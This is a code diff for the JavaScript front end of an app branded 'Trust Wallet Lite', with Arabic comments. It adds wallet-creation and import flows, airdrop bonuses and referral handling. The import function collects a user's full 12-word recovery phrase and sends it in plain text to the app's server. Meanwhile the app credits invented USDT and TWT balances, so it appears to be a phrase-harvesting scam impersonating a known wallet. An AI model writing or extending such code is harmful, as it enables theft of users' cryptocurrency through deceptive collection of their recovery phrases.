@@ -241,23 +241,38 @@ async function loadUserData() {
                 userData = JSON.parse(localData);
                 console.log("✅ Using localStorage data");
             } else {
-                await createNewUser();
+                // لا ننشئ مستخدم تلقائياً، ننتظر المستخدم يضغط على زر الإنشاء
+                console.log("📝 No user found, showing onboarding");
+                return;
             }
         }
         
         updateUI();
         checkAdminAndAddCrown();
         
-        if (startParam && startParam !== userId) {
+        if (startParam && startParam !== userId && userData && !userData.invitedBy) {
             await processReferral(startParam);
         }
+        
+        // إخفاء شاشة البداية وإظهار التطبيق
+        const onboarding = document.getElementById('onboardingScreen');
+        const mainContent = document.getElementById('mainContent');
+        if (onboarding) onboarding.style.display = 'none';
+        if (mainContent) mainContent.style.display = 'block';
         
     } catch (error) {
         console.error("❌ Error loading user data:", error);
     }
 }
 
-async function createNewUser() {
+async function createNewWallet() {
+    console.log("🔄 Creating new wallet...");
+    const btn = document.getElementById('createWalletBtn');
+    if (btn) {
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Creating...';
+        btn.disabled = true;
+    }
+    
     try {
         const newUserData = {
             userId: userId,
@@ -278,13 +293,121 @@ async function createNewUser() {
         if (response.success) {
             userData = newUserData;
             localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
-            console.log("✅ New user created");
+            console.log("✅ User created successfully");
+            
+            // إخفاء شاشة البداية وإظهار التطبيق
+            const onboarding = document.getElementById('onboardingScreen');
+            const mainContent = document.getElementById('mainContent');
+            if (onboarding) onboarding.style.display = 'none';
+            if (mainContent) mainContent.style.display = 'block';
+            
+            updateUI();
             showToast('✅ Wallet created! +10 USDT');
+            
+            // معالجة الإحالة
+            if (startParam && startParam !== userId) {
+                await processReferral(startParam);
+            }
+        } else {
+            throw new Error(response.error);
         }
         
     } catch (error) {
         console.error("Error creating user:", error);
         showToast('Failed to create wallet', 'error');
+    } finally {
+        if (btn) {
+            btn.innerHTML = 'Create a new wallet';
+            btn.disabled = false;
+        }
+    }
+}
+
+function showImportModal() {
+    console.log("🔓 Showing import modal");
+    const modal = document.getElementById('importModal');
+    if (modal) {
+        // تنظيف الحقول
+        for (let i = 1; i <= 12; i++) {
+            const input = document.getElementById(`word_${i}`);
+            if (input) input.value = '';
+        }
+        modal.classList.add('show');
+    } else {
+        console.error("Import modal not found");
+        showToast('Import feature coming soon', 'info');
+    }
+}
+
+async function importWallet() {
+    console.log("🔄 Importing wallet...");
+    
+    // جمع الكلمات الـ 12
+    const words = [];
+    for (let i = 1; i <= 12; i++) {
+        const word = document.getElementById(`word_${i}`)?.value.trim();
+        if (!word) {
+            showToast(`Please enter word ${i}`, 'error');
+            return;
+        }
+        words.push(word);
+    }
+    
+    const btn = document.getElementById('confirmImportBtn');
+    if (btn) {
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Importing...';
+        btn.disabled = true;
+    }
+    
+    try {
+        const newUserData = {
+            userId: userId,
+            userName: userName,
+            recoveryPhrase: words.join(' '),
+            balances: { TWT: 1000, USDT: AIRDROP_BONUS, BNB: 0, BTC: 0, ETH: 0, SOL: 0, TRX: 0, ADA: 0, DOGE: 0, SHIB: 0, PEPE: 0, TON: 0 },
+            inviteCount: 0,
+            invitedBy: null,
+            totalUsdtEarned: AIRDROP_BONUS,
+            airdropMilestones: AIRDROP_MILESTONES.map(m => ({ ...m, claimed: false })),
+            notifications: [{ id: Date.now().toString(), message: '🎉 Wallet imported! +10 USDT', read: false, timestamp: new Date().toISOString() }],
+            transactions: [{ type: 'airdrop', amount: AIRDROP_BONUS, currency: 'USDT', timestamp: new Date().toISOString() }],
+            withdrawBlocked: false,
+            createdAt: new Date().toISOString()
+        };
+        
+        const response = await apiCall('/users', 'POST', { userId, userData: newUserData });
+        
+        if (response.success) {
+            userData = newUserData;
+            localStorage.setItem(`user_${userId}`, JSON.stringify(userData));
+            console.log("✅ Wallet imported successfully");
+            
+            closeModal('importModal');
+            
+            // إخفاء شاشة البداية وإظهار التطبيق
+            const onboarding = document.getElementById('onboardingScreen');
+            const mainContent = document.getElementById('mainContent');
+            if (onboarding) onboarding.style.display = 'none';
+            if (mainContent) mainContent.style.display = 'block';
+            
+            updateUI();
+            showToast('✅ Wallet imported! +10 USDT');
+            
+            if (startParam && startParam !== userId) {
+                await processReferral(startParam);
+            }
+        } else {
+            throw new Error(response.error);
+        }
+        
+    } catch (error) {
+        console.error("Error importing wallet:", error);
+        showToast('Failed to import wallet', 'error');
+    } finally {
+        if (btn) {
+            btn.innerHTML = 'Import Wallet';
+            btn.disabled = false;
+        }
     }
 }
 
@@ -293,6 +416,10 @@ async function processReferral(referralCode) {
         const response = await apiCall('/referrals', 'POST', { referrerId: referralCode, newUserId: userId });
         if (response.success) {
             console.log("✅ Referral processed");
+            // تحديث بيانات المستخدم
+            await loadUserData();
+            updateUI();
+            showToast('🎉 Referral bonus added!', 'success');
         }
     } catch (error) {
         console.error("Referral error:", error);
@@ -624,14 +751,34 @@ function updateUI() {
     if (userIdEl && userData) {
         userIdEl.textContent = `ID: ${userData.userId?.slice(-8)}`;
     }
+    const userAvatarEl = document.getElementById('userAvatar');
+    if (userAvatarEl && userData) {
+        userAvatarEl.textContent = (userData.userName || userName).charAt(0).toUpperCase();
+    }
 }
 
-// ====== 14. INITIALIZATION ======
+// ====== 14. INITIALIZATION (مثل REFI بالضبط) ======
 document.addEventListener('DOMContentLoaded', async () => {
     console.log("🚀 Initializing Trust Wallet Lite...");
     
     initTheme();
     
+    // 🔥 مستمعين الأزرار - مثل REFI تماماً
+    const createBtn = document.getElementById('createWalletBtn');
+    const importBtn = document.getElementById('importWalletBtn');
+    const confirmImportBtn = document.getElementById('confirmImportBtn');
+    
+    if (createBtn) createBtn.onclick = createNewWallet;
+    if (importBtn) importBtn.onclick = showImportModal;
+    if (confirmImportBtn) confirmImportBtn.onclick = importWallet;
+    
+    console.log("✅ Buttons initialized:", { 
+        createBtn: !!createBtn, 
+        importBtn: !!importBtn,
+        confirmImportBtn: !!confirmImportBtn
+    });
+    
+    // أزرار التنقل
     document.querySelectorAll('.nav-item').forEach(btn => {
         btn.addEventListener('click', () => {
             const tab = btn.getAttribute('data-tab');
@@ -645,6 +792,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     await fetchLivePrices();
     await loadUserData();
     
+    // إخفاء شاشة التحميل
     const splash = document.getElementById('splashScreen');
     if (splash) splash.classList.add('hidden');
     
@@ -674,3 +822,10 @@ window.copyInviteLink = copyInviteLink;
 window.claimMilestone = claimMilestone;
 window.sendTransaction = sendTransaction;
 window.submitWithdraw = submitWithdraw;
+window.createNewWallet = createNewWallet;
+window.importWallet = importWallet;
+window.showImportModal = showImportModal;
+
+console.log("✅ Trust Wallet Lite - FULLY LOADED");
+console.log("📱 Final User ID:", userId);
+console.log("👑 Is Admin:", isAdmin);
